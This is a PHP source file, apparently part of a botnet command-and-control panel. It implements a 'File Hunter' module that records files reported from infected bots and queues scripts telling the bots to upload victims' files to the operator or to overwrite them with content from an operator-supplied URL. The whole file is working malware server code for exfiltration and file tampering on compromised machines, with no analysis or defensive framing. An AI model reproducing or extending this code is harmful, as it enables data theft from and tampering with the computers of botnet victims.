<?php
require_once 'system/lib/db.php';
require_once 'system/lib/shortcuts.php';
require_once 'system/lib/report.php';

/** CronJobs concerning File Hunter
 */
class cronjobs_filehunter implements ICronJobs {
	function _insert_files($inserts, &$ret){
		# Insert new files
		$upd = '
				`table`={i:table}, `report_id`={i:report_id}, `rtime`={i:rtime},
				`botnet`={s:botnet}, `botId`={s:botId},
				`f_path`={s:f_path}, `f_size`={i:f_size}, `f_mtime`={i:f_mtime}, `f_hash`={s:f_hash},
				`state`={s:state}
				';

		foreach ($inserts as $q_data){
			# Search if duplicate
			$r = mysql_fetch_assoc(mysql_q(mkquery('SELECT `id`, `f_hash` FROM `botnet_rep_filehunter` WHERE `botId`={s:botId} AND `f_path`={s:f_path};', $q_data)));

			if ($r === FALSE){
				$query = 'INSERT INTO `botnet_rep_filehunter` SET '.$upd.', `upd`={i:upd};';
				$ret['new_files']++;
				$q_data['state'] = 'log';
			} else {
				$q_data['id'] = $r['id'];
				$upd_hash = '';
				if ($r['f_hash'] != $q_data['f_hash']) # hash differs
					$upd_hash = ', `upd`={i:upd}, `f_local`=NULL'; # only then update it

				$query = 'UPDATE `botnet_rep_filehunter` SET '.$upd.$upd_hash.' WHERE `id`={i:id}';

				$ret['updated_files']++;
				$q_data['state'] = 'updated';
				}

			mysql_q(mkquery($query, $q_data));
			}
		}

	/** Parse new reports, looking for new/updated files that matched on bots
	 * @cron period: 5m
	 */
	function cronjob_parse_reports(){
		$report_tables = list_reports_tables(true);
		$ret = array('new_reports' => 0, 'new_files' => 0, 'updated_files' => 0);

		# New reports criteria
		list($max_yymmdd, $max_report_id) = mysql_fetch_row(mysql_q(
			'SELECT `table`, MAX(`report_id`) FROM `botnet_rep_filehunter` GROUP BY `table` ORDER BY `table` DESC;'
			));

		# Search for new reports
		foreach($report_tables as $yymmdd){
			if (!is_null($max_yymmdd) && $yymmdd < $max_yymmdd) continue; # don't mess with the past

			$R = mysql_q(mkquery(
				'SELECT
					{i:yymmdd} AS `table`,
					`id` AS `report_id`,
					`rtime` AS `rtime`,
					`botnet` AS `botnet`,
					`bot_id` AS `botId`,
					NULL AS `f_path`, NULL AS `f_size`, NULL AS `f_hash`, NULL AS `f_mtime`,
					SUBSTRING(`context`,1,10000) AS `context`
				 FROM `botnet_reports_{=:yymmdd}`
				 WHERE `id` > {i:new_ids} AND `type`={i:type}
				',
				array(
					'yymmdd' => $yymmdd,
					'new_ids' => ($yymmdd === $max_yymmdd) ? $max_report_id : 0,
					'type' => BLT_FILE_SEARCH,
				)));
			$ret['new_reports'] += mysql_num_rows($R);

			# Iterate & parse new reports
			$inserts = array(); # q_data array
			while ($R && !is_bool($r = mysql_fetch_assoc($R))){
				$r['upd'] = time();
				preg_match_all('~^(.+)\s*:\s*(.+)\s*$~iuUmS', $r['context'], $matches, PREG_SET_ORDER);
				unset($r['context']); # redundant data
				# Parse
				foreach ($matches as $m){
					$name = trim(strtolower($m[1]));
					$value = trim($m[2]);
					switch ($name){
						case 'path':
							# Store prev
							if (!is_null($r['f_path']))
								$inserts[] = $r;
							# Add
							$r['f_path'] = $value;
							break;
						case 'size':
							$r['f_size'] = (int)$value;
							break;
						case 'hash':
							$r['f_hash'] = $value;
							break;
						case 'time':
							$r['f_mtime'] = strtotime($value);
							break;
						}
					}

				if (!is_null($r['f_path']))
					$inserts[] = $r; # the last one

				if (count($inserts) > 100){
					$this->_insert_files($inserts, $ret);
					$inserts = array();
					}
				}

			$this->_insert_files($inserts, $ret);
			}

		return $ret;
		}

	/** Handle user scripts: download & upload
	 * @cron period: 1m
	 */
	function cronjob_file_scripts(){
		$R_FILES = mysql_q('SELECT `id`, `botnet`, `botId`, `f_path`, `job` FROM `botnet_rep_filehunter` WHERE `job` IS NOT NULL;');
		while ($R_FILES && !is_bool($r_file = mysql_fetch_assoc($R_FILES))){
			$job = json_decode($r_file['job'], true);

			$update = array();
			switch ($job['name']){
				# Issue a script to download the file
				# { 'name': 'download' }
				case 'download':
					add_simple_script($r_file['botId'],
							'filehunter:download:'.date('Ymd_his_u'),
							sprintf('upload_file "%s"', $r_file['f_path'])
							);
					$update['state'] = 'downloading';
					$update['job'] = json_encode(array('name' => 'download:wait', 'script_id' => mysql_insert_id()));
					$update['f_local'] = NULL;
					break;
				# Issue a script to upload-replace the file
				# { 'name': 'upload', 'url': 'http://.....' }
				case 'upload':
					add_simple_script(
						$r_file['botId'],
							'filehunter:upload:'.date('Ymd_his_u'),
						sprintf('download_file "%s" "%s"', $job['url'], $r_file['f_path'])
						);
					$update['state'] = 'uploading';
					$update['job'] = json_encode(array('name' => 'download:wait', 'script_id' => mysql_insert_id()));
					break;
				# Download finished: now have a local copy
				# Here we wait for a script report to appear: error | ok. gate.php should have updated `f_local`
				# { 'name': 'download:wait', 'script': 10 }
				case 'download:wait':
				# Upload finished: file replaced
				# { 'name': 'upload:wait', 'script': 10 }
				case 'upload:wait':
					$r = mysql_fetch_assoc(mysql_q(mkquery(
						'SELECT `r`.`type`, `r`.`rtime`, `r`.`report`
						 FROM `botnet_scripts` `s` CROSS JOIN `botnet_scripts_stat` `r` USING(`extern_id`)
						 WHERE `s`.`id`={i:id} AND (`r`.`type`=2 OR `r`.`type`>2) ', # type=1 SENT, type=2 OK, type>2 ERROR
						array('id' => $job['script_id'])
						)));
					if ($r !== FALSE){
						$update['job'] = NULL;
						$success_state = substr($job['name'], 0, strpos($job['name'], ':')).'ed'; # uploaded, downloaded
						$update['state'] = ($r['type'] > 2)? 'error' : $success_state;
						}
					break;
				}

			# Update
			if (!empty($update)){
				$update['upd'] = time();
				mysql_q(mkquery('UPDATE `botnet_rep_filehunter` SET {SETA:SETA} WHERE `id`={i:id}', array('id' => $r_file['id'], 'SETA' => $update)));
				}
			}

		return array('pending_jobs' => mysql_num_rows($R_FILES));
		}
	}
